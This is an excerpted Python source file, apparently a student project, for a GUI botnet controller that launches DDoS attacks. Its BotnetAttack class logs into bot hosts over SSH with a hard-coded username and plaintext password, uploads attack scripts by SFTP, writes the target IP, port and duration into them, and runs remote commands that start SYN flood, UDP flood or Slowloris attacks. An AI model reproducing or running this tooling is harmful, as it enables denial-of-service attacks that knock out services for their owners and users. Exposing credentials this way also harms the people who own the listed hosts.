...
class DDOSGUI(ctk.CTk):
    ...
    def window_ddos(self):
        ...
        self.ent_ip = ctk.CTkEntry(self.ddos_fr, width=269, height=38, fg_color='white', text_color='black', corner_radius=7)
        ...
        self.ent_port = ctk.CTkEntry(self.ddos_fr, width=171, height=38,fg_color='white', text_color='black', corner_radius=7)
        ...
        self.ent_ttl_req = ctk.CTkEntry(self.ddos_fr, width=226, height=38, fg_color='white', text_color='black',corner_radius=7)
        ...
        self.ent_atk_time = ctk.CTkEntry(self.ddos_fr, width=226, height=38, fg_color='white', text_color='black',corner_radius=7)
        ...
        lb_jmlh_bot.place(x=90,y=372)
        self.ent_jmlh_bot = ctk.CTkEntry(self.ddos_fr, width=219, height=34, fg_color='white', text_color='black',corner_radius=7) #entry
        self.ent_jmlh_bot.place(x=90,y=400)

        lb2_jmlh_bot = ctk.CTkLabel(self.ddos_fr, text="Active Botnet's = [4]", font=('OpenSans', 15, 'bold'), text_color='white')
        lb2_jmlh_bot.place(x=338,y=404)

        status_use = ctk.CTkLabel(self.ddos_fr, text=" ", image=photos[5])
        status_use.place(x=79,y=460)
        #status_fr = ctk.CTkScrollableFrame(self.ddos_fr)
        #status_fr.place(x=78,y=400)
        ...
        if self.response1=='yes':
            lb_jmlh_bot.configure(text="Masukan nama filenya dibawah!")
            self.ent_jmlh_bot.configure(placeholder_text='filename.txt')
            open_file = ctk.CTkButton(self.ddos_fr, text='open file', font=('OpenSans', 15, 'bold'),fg_color='#253E5B',width=137, height=41,corner_radius=10)
            open_file.place(x=570,y=390)
...
class BotnetAttack(DDOSGUI):
    def __init__(self, title, size):
        ...
        self.hosts = [
            {'ip': '192.168.43.130', 'port': 22, 'username': 'ASUS', 'password': '03061122'},
    ...
    def run_command_on_host(self,host, port, username, password, command, attack_type: str):
        ...
        sftp.put('C:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/Flask_DDOS/Flask_DDOS.zip', '/home/'+username+'/Music/Flask_DDOS.zip')
                
        # memasukkan file selenium dari master ke remote botnet
                
        if attack_type == "SYN Flood":
            sftp.put('c:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_SYN.py', '/home/'+username+'/Music/selenium_SYN.py')
            sftp.close()
        elif attack_type == "UDP Flood":
            sftp.put('C:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_UDP.py', '/home/'+username+'/Downloads/selenium_UDP.py')
            sftp.close()
        elif attack_type == "Slowloris":
            sftp.put('C:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_Slowloris.py', '/home/'+username+'/Downloads/selenium_Slowloris.py')
            sftp.close()
    ...
    def serangan_botnet(self,hosts):
        ...
        if self.input_pilih_serangan not in self.tipe_serangan_valid:
            ...
            # modifikasi file python selenium_SYN
            with open("c:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_SYN.py", "r+") as f:
                teks = f.read().split("\n")

                for i, line in enumerate(teks):
                    if "ipv4 = " in line:
                        teks[i] = line.replace(line, f"ipv4 = '{target_ip}'")
                    elif "port = " in line:
                        teks[i] = line.replace(line, f"port = {port}")
                    elif "attack_duration = " in line:
                        teks[i] = line.replace(line, f"attack_duration = {attack_duration}")
                
                # menulis kembali teks yang telah direplace
                f.seek(0)
                f.write("\n".join(teks))
            ...
            cmd = f"export DISPLAY=:0.0; cd Downloads; unzip -o Flask_DDOS.zip; cd Flask_DDOS"
            command = cmd
            ...
            # modifikasi file python selenium_UDP
            with open("c:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_UDP.py", "r+") as f:
                teks = f.read().split("\n")
                ...
                for i, line in enumerate(teks):
                    if "ipv4 = " in line:
                        ...
                        teks[i] = line.replace(line, f"port = {port}")
                    elif "time_pause = " in line:
                        teks[i] = line.replace(line, f"time_pause = {time_pause}")
                    elif "attack_duration = " in line:
                        teks[i] = line.replace(line, f"attack_duration = {attack_duration}")
            ...
            cmd = f"export DISPLAY=:0.0; cd Downloads; unzip -o Flask_DDOS.zip; cd Flask_DDOS; python3 Web_DDOS.py; cd ..; python3 selenium_UDP.py"
            command = cmd
            ...
            # modifikasi file python selenium_UDP
            with open("c:/Users/ASUS/Documents/Tugas_Kampus/SEMESTER_2/MiniPBL/botnet/Main_Branch_V1/selenium_Slowloris.py", "r+") as f:
                teks = f.read().split("\n")
                ...
                for i, line in enumerate(teks):
                    if "ipv4 = " in line:
                        ...
                        teks[i] = line.replace(line, f"port = {port}")
                    elif "total_requests = " in line:
                        teks[i] = line.replace(line, f"total_requests = {total_requests}")
                    elif "attack_duration = " in line:
                        teks[i] = line.replace(line, f"attack_duration = {attack_duration}")
            ...
            cmd = f"export DISPLAY=:0.0; cd Downloads; unzip -o Flask_DDOS.zip; cd Flask_DDOS; python3 Web_DDOS.py; cd ..; python3 selenium_Slowloris.py"
            command = cmd
    ...
    def stop_attacking_on_host(self,host, port, username, password, command):
        ...
        # mengirim file python (selenium) untuk menghentikan serangan DDOS
        sftp = ssh_client.open_sftp()
        sftp.put('stop_selenium_firefox.py', '/home/'+username+'/Desktop/stop_selenium_firefox.py')
        sftp.close()
    ...
    def stop_serangan_botnet(self):
        cmd = f"export DISPLAY=:0.0; cd Downloads; python3 stop_selenium_firefox.py"
        command = cmd
